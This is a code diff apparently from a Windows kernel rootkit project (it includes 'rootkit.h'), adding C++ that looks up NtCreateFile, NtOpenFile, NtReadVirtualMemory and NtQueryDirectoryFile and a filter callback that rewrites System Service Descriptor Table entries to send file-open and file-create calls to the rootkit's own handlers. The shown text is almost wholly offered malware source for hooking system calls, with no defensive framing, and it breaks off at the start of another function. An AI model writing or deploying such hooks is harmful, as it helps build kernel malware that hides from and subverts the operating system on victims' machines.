@@ -1,5 +1,54 @@
 #include "rootkit.h"
 
+VOID SetNtFunction() {
+				UNICODE_STRING str;
+				WCHAR name1[256]{ L"NtCreateFile" };
+				RtlInitUnicodeString(&str, name1);
+				g_NtCreateFile = (FNtCreateFile)MmGetSystemRoutineAddress(&str);
+				
+				WCHAR name1_2[256]{ L"ZwCreateFile" };
+				RtlInitUnicodeString(&str, name1_2);
+				g_ZwCreateFile = (FNtCreateFile)MmGetSystemRoutineAddress(&str);
+
+				WCHAR name2[256]{ L"NtOpenFile" };
+				RtlInitUnicodeString(&str, name2);
+				g_NtOpenFile = (FNtOpenFile)MmGetSystemRoutineAddress(&str);
+				
+				WCHAR name2_2[256]{ L"ZwOpenFile" };
+				RtlInitUnicodeString(&str, name2_2);
+				g_ZwOpenFile = (FNtOpenFile)MmGetSystemRoutineAddress(&str);
+
+				WCHAR name3[256]{ L"NtReadVirtualMemory" };
+				RtlInitUnicodeString(&str, name3);
+				g_NtReadVirtualMemory = (FNtReadVirtualMemory)MmGetSystemRoutineAddress(&str);
+				
+				WCHAR name3_3[256]{ L"ZwReadVirtualMemory" };
+				RtlInitUnicodeString(&str, name3_3);
+				g_ZwReadVirtualMemory = (FNtReadVirtualMemory)MmGetSystemRoutineAddress(&str);
+
+				WCHAR name4[256]{ L"NtQueryDirectoryFile" };
+				RtlInitUnicodeString(&str, name4);
+				g_NtQueryDirectoryFile = (FNtQueryDirectoryFile)MmGetSystemRoutineAddress(&str);
+				
+				WCHAR name4_2[256]{ L"ZwQueryDirectoryFile" };
+				RtlInitUnicodeString(&str, name4_2);
+				g_ZwQueryDirectoryFile = (FNtQueryDirectoryFile)MmGetSystemRoutineAddress(&str);
+}
+
+void __fastcall filter(unsigned long ssdt_index, void** ssdt_address)
+{
+				UNREFERENCED_PARAMETER(ssdt_index);
+
+				if (*ssdt_address == g_NtCreateFile) *ssdt_address = MyNtCreateFile;
+				else if (*ssdt_address == g_ZwCreateFile) *ssdt_address = MyNtCreateFile;
+				else if (*ssdt_address == g_NtOpenFile) *ssdt_address = MyNtOpenFile;
+				else if (*ssdt_address == g_ZwOpenFile) *ssdt_address = MyNtOpenFile;
+				//else if (*ssdt_address == g_NtReadVirtualMemory) *ssdt_address = MyNtReadVirtualMemory;
+				//else if (*ssdt_address == g_ZwReadVirtualMemory) *ssdt_address = MyNtReadVirtualMemory;
+				//else if (*ssdt_address == g_NtQueryDirectoryFile) *ssdt_address = MyNtQueryDirectoryFile;
+				//else if (*ssdt_address == g_ZwQueryDirectoryFile) *ssdt_address = MyNtQueryDirectoryFile;
+}
+
 NTSTATUS GetProcessImageName(HANDLE ProcessHandle, PUNICODE_STRING ProcessImageName)
 {
 				NTSTATUS status = STATUS_ACCESS_DENIED;
